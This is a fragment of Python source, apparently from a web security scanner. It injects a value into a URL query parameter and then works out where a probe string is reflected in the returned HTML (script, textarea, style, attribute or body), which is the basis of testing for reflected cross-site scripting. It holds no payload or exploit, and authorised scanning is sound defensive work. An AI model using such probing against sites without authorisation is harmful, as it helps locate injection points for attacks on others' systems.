def inject_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))


def _snippet(text: str, idx: int, length: int) -> str:
    s = max(0, idx - 60)
    e = min(len(text), idx + length + 60)
    return text[s:e].strip()


def detect_context(html: str, probe: str) -> str:
    idx = html.find(probe)
    if idx == -1:
        return "html_body"
    snippet = html[max(0, idx - 300): idx]
    for tag in ["script", "textarea", "style"]:
        if re.search(rf"<{tag}[^>]*>", snippet, re.I):
            close = snippet.rfind(f"</{tag}>")
            open_ = snippet.rfind(f"<{tag}")
            if open_ > close:
                return tag
    last_lt = snippet.rfind("<")
    last_gt = snippet.rfind(">")
    if last_lt > last_gt:
        return "attribute"
    return "html_body"


